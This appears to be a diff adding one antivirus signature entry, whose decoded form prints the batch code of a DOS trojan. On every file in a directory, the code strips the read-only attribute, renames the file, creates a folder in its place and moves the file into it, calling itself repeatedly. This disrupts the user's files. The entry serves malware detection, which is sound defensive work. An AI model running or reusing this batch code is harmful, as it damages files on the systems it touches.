@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36608
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ctty nul if %1==" goto enbucla attrib -r %1 ren %1 enbucla.swp md %1 move enbucla.swp %1\ ren %1\enbucla.swp %1\%1 goto finbucle :enbucla for %%n in(*.*) do call %0 %%n :finbucle 
